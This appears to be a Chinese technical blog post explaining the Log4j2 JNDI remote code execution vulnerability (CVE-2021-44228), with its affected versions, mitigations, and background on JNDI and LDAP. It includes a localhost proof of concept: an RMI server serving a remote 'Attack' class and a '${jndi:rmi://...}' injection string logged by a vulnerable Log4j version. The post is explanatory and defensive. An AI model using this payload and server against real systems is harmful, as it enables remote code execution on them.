---
layout:     post
title:      "解析 Apache Log4j 远程代码注入漏洞"
subtitle:   ""
description: "2021年12月9日，Apache Log4j2 Java 日志模块存在远程命令执行漏洞可直接控制目标服务器问题，攻击者攻击难度极低。由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。该漏洞可通过 critical、error、warining、notice、info、debug等日志级别触发，只需部分日志内容可控，此漏洞波及大量开源组件，包括 ELK、 Apache 、Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。目前漏洞细节已被公开，攻击者可利用该漏洞进行远程命令执行。"
author: "陈谭军"
date: 2021-12-12
published: true
tags:
    - java
categories:
    - TECHNOLOGY
showtoc: true
---

# 漏洞说明

2021年12月9日，Apache Log4j2 Java 日志模块存在远程命令执行漏洞可直接控制目标服务器问题，攻击者攻击难度极低。由于 Apache Log4j2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。该漏洞可通过 critical、error、warining、notice、info、debug等日志级别触发，只需部分日志内容可控，此漏洞波及大量开源组件，包括 ELK、 Apache 、Struts2、Apache Solr、Apache Druid、Apache Flink 等均受影响。目前漏洞细节已被公开，攻击者可利用该漏洞进行远程命令执行。
![](/images/2021-12-12-apache-log4j2-security/1.png)

Apache Log4j2 远程代码执行漏洞的详细信息已被披露，而经过分析，本次 Apache Log4j 远程代码执行漏洞，正是由于组件存在 Java JNDI 注入漏洞。当程序将用户输入的数据记入日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码。  
据悉，此次 Apache Log4j2 远程代码执行漏洞风险已被业内评级为“高危”，且漏洞危害巨大，利用门槛极低。有报道称，目前 Apache Solr、Apache Struts2、Apache Druid、Apache Flink 等众多组件及大型应用均已经受到了影响，需尽快采取防御手段。

# 关键因素

## 概括

2.15.0 之前的 Log4j 版本存在通过 ldap JNDI 解析器的远程代码执行漏洞。根据 Apache 的 Log4j 安全指南：Apache Log4j2 <=2.14.1 在配置、日志消息和参数中使用的 JNDI 功能不能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。
![](/images/2021-12-12-apache-log4j2-security/2.png)

## 影响

使用易受攻击的 Log4J 版本记录不受信任或用户控制的数据可能会导致针对我们的应用程序的远程代码执行 (RCE)。这包括记录的错误中包含的不受信任的数据，例如异常跟踪、身份验证失败和用户控制输入的其他意外向量。
![](/images/2021-12-12-apache-log4j2-security/3.png)

## 影响版本

2.15.0 之前的任何 Log4J 版本都会受到此特定问题的影响。Log4J 的 v1 分支被认为是生命周期结束 (EOL)，它容易受到其他 RCE 向量的攻击，因此建议仍然尽可能更新到 2.15.0。

## 补救建议

此问题已在 Log4J v2.15.0 中修复。Apache 日志服务团队提供以下缓解建议：
在以前的版本 (>=2.10) 中，可以通过将系统属性“log4j2.formatMsgNoLookups”设置为“true”或从类路径中删除 JndiLookup 类来缓解这种行为（例如：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class）。

Java 8u121 通过将“com.sun.jndi.rmi.object.trustURLCodebase”和“com.sun.jndi.cosnaming.object.trustURLCodebase”默认为“false”来防止 RCE。  

可以通过在项目存储库中搜索 Log4J 使用情况来手动检查受影响版本的 Log4J 的使用情况，该存储库通常位于 pom.xml 文件中。在可能的情况下，升级到 Log4J 版本 2.15.0。请注意，Log4J v1 已结束生命周期 (EOL)，不会收到针对此问题的补丁。Log4J v1 也容易受到其他 RCE 向量的影响，我们建议尽可能迁移到 Log4J 2.15.0。如果无法升级，请确保在客户端和服务器端组件上都设置 
-Dlog4j2.formatMsgNoLookups=true 系统属性。

## 案例

![](/images/2021-12-12-apache-log4j2-security/4.png)
<!-- ![](/images/2021-12-12-apache-log4j2-security/5.png) -->

此次演示，主要在本地启用了一个 RMI Server，注册了一个本地的 nginx 代理服务，本地代理服务有一个远程字节码文件，Log4j 去调用这个远程 RMI Server 服务，此时 Log4j demo 如果使用的是低版本的 Log4j-Core 日志框架，就会被注入 Attack 字节码文件。
```
public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Local Registry RMI in 1099");
            Reference reference = new Reference("Attack",
                    "Attack", "http://127.0.0.1:8000/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("attack", referenceWrapper);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
```
public class Log4jDemo {
    private static final Logger LOGGER = LogManager.getLogger();
    /**
     * 旧版本jdk带来的问题，这些问题在jdk6u211，7u201，8u191之后就不会再发生了，
     * 除非你刻意添加参数信任了远程文件，因为jdk压根就不信任远程class文件,
     * 至少以下这种场景简单调用远程 class 文件是不会发生的
     *
     * @param args
     */
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        try {
            String name = "${jndi:rmi://127.0.0.1:1099/attack}";
            String os = "${java:os}";
            LOGGER.info("tanjunchen {}", os);
            // 2021-12-12 11:28:27,963 main WARN Error looking up JNDI resource [rmi://127.0.0.1:1099/attack].
            // javax.naming.ConfigurationException: The object factory is untrusted.
            // Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
            LOGGER.info("Hello attack,{}", name);
        } catch (Exception e) {
            
        }
    }
}
```
本地 nginx 远程代理：
```
mkdir -p ~/opensource/nginx-local-test/html
➜  html tree .
.
├── 50.html
├── Attack.class
└── index.html

0 directories, 3 files
```
将 RMIServer 地址中的 Attack 字节码文件拷贝到 ~/opensource/nginx-local-test/html 目录下，本地启动一个 nginx 服务。
```
docker run -d -p 8000:80 -v ~/opensource/nginx-local-test/html:/usr/share/nginx/html nginx
```
Log4j pom 文件
```
 <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.12.1</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.12.1</version>
        </dependency>
    </dependencies>
```

# JNDI

![](/images/2021-12-12-apache-log4j2-security/6.png)

## 简介

JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。两者之间的关键差别是目录服务中对象不但可以有名称还可以有属性（例如，用户有email地址），而命名服务中对象没有属性。

## 命名服务

命名服务是一种服务，它提供了为给定的数据集创建一个标准名字的能力。它允许把名称同Java对象或资源关联起来，而不必指出对象或资源的物理ID。这类似于字典结构（或者是Java的map结构），该结构中键映射到值。例如在Internet上的域名服务（domain naming service，DNS）就是提供将域名映射到IP地址的命名服务，在打开网站时一般都是在浏览器中输入名字，通过DNS找到相应的IP地址，然后打开。

所有的因特网通信都使用TCP、UDP或IP协议。IP地址由4个字节32位二进制数字组成，数字和名字相比，对于人来说名字比数字要容易记忆，但对于计算机来讲，它更善于处理数字。

其实所有的命名服务都提供DNS这种基本功能，即一个系统向命名服务注册，命名服务提供一个值到另一个值的映射。然后，另外一个系统访问命名服务就可以取得映射信息。这种交互关系对分布式企业级应用来讲显得非常重要，在Java中，基本的名字操作包含在Context接口中。

## 目录服务

目录服务是一种特殊类型的数据库，与SQL Server、Access、Oracle等关系数据库管理系统相反，构造目录服务的目的是为了处理基于行为的事务，并且使用一种关系信息模型。目录服务将命名服务的概念进一步引申为提供具有层次结构的信息库，这一信息库除了包含一对一的关系外，还有信息的层次结构。对目录服务而言，这种层次结构通常用于优化搜索操作，并且也可以按实际情况进行分布或者跨网络复制。

一个目录服务通常拥有一个名字服务（但是一个名字服务不必具有一个目录服务）。如电话簿就是一个典型的目录服务，一般先在电话簿里找到相关的人名，再找到这个人的电话号码。

每一种目录服务都可以存储有关用户名、用户密码、用户组（如有关访问控制的    信息）、以太网地址、IP地址等信息。它所支持的信息和操作会因为所使用的目录服务的不同而不同。遗憾的是，访问不同目录服务的协议也会不同，所以读者需要了解多种API。

这就是JNDI的起源，就像JDBC一样，JNDI充当不同名称和目录服务的通用API或者说是前端，然后使用不同的后端适配器来连接实际服务。

JNDI是J2EE技术中的一个完整的组件。它支持通过一个单一的方法访问不同的、新的和已经存在的服务的方法。这种支持允许任何服务提供商执行通过标准服务提供商接口（SPI）协定插入JNDI框架。

## 作用

JNDI的功能简单说就是可以简单的方式去查找某种资源。JNDI是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层。比如在Tomcat中配置了一个JNDI数据源，那么在程序中之需要用Java标准的API就可以查找到这个数据源，以后数据源配置发生变化了，等等，程序都不需要改动，需要改改JNDI的配置就行。增加了程序的灵活性，也给系统解耦了。

## 总结

J2EE 规范要求所有 J2EE 容器都要提供 JNDI 规范的实现。JNDI 在 J2EE 中的角色就是“交换机” - J2EE 组件在运行时间接地查找其他组件、资源或服务的通用机制。在多数情况下，提供 JNDI 供应者的容器可以充当有限的数据存储，这样管理员就可以设置应用程序的执行属性，并让其他应用程序引用这些属性（Java 管理扩展（Java Management Extensions，JMX）也可以用作这个目的）。JNDI 在 J2EE 应用程序中的主要角色就是提供间接层，这样组件就可以发现所需要的资源，而不用了解这些间接性。

在 J2EE 中，JNDI 是把 J2EE 应用程序合在一起的粘合剂，JNDI 提供的间接寻址允许跨企业交付可伸缩的、功能强大且很灵活的应用程序。这是 J2EE 的承诺，而且经过一些计划和预先考虑，这个承诺是完全可以实现的。

# LDAP

LDAP（Light Directory Access Portocol），它是基于X.500标准的轻量级目录访问协议。目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。LDAP目录服务是由目录数据库和一套访问协议组成的系统。

LDAP(Light Directory Access Portocol)是轻量目录访问协议，基于X.500标准，支持TCP/IP；是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。接入LDAP的前提是你们公司有LDAP服务器。

## LDAP 作用

LDAP主要作用就是保障用户账号安全性。可以在任何计算机平台上，用很容易获得的而且数目不断增加的LDAP的客户端程序访问LDAP目录。LDAP服务器安装起来很简单，也容易维护和优化。

## LDAP 目录

LDAP目录以树状的层次结构来存储数据。每个目录记录都有标识名（Distinguished Name，简称DN），用来读取单个记录。其几个关键词含义如下：
1. base dn：LDAP目录树的最顶部，也就是树的根，是上面的dc=test,dc=com部分，一般使用公司的域名，也可以写做o=test.com，前者更灵活一些；
1. dc:：Domain Component，域名部分；
1. ou：Organization Unit，组织单位，用于将数据区分开；
1. cn：Common Name，一般使用用户名；
1. uid：用户id，与cn的作用类似；
1. sn：Surname， 姓；
1. rdn：Relative dn，dn中与目录树的结构无关的部分，通常存在cn或者uid这个属性里。

# Bug 修复

## 解决方案

目前，Apache Log4j 已经发布了新版本来修复该漏洞，请受影响的用户将 Apache Log4j2 的所有相关应用程序升级至最新的 Log4j-2.15.0 版本，同时升级已知受影响的应用程序和组件，如 srping-boot-strater-log4j2、Apache Solr、Apache Flink、Apache Druid 等。

## 临时解决方案

以下只是举例，强烈建议升级到官方最新的版本。
```
JVM 参数添加 -Dlog4j2.formatMsgNoLookups=true
log4j2.formatMsgNoLookups=True
FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true
```

## 安全建议

据 Apache 官方最新信息显示，release 页面上已经更新了 Log4j 2.15.0 版本，主要是那个包，漏洞就是在这个包里产生的，如果你的程序有用到，尽快紧急升级。

# 参考

1. NVD - CVE-2021-44228
1. apache/logging-log4j2#608
1. GitHub - tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce: Apache Log4j 远程代码执行
1. Log4j – Changes
1. Log4j – Log4j 2 Lookups
1. [LOG4J2-3198] Message lookups should be disabled by default - ASF JIRA
1. [LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA
1. Log4j – Migrating from Log4j 1.x
1. log4j – Apache Log4j Security Vulnerabilities

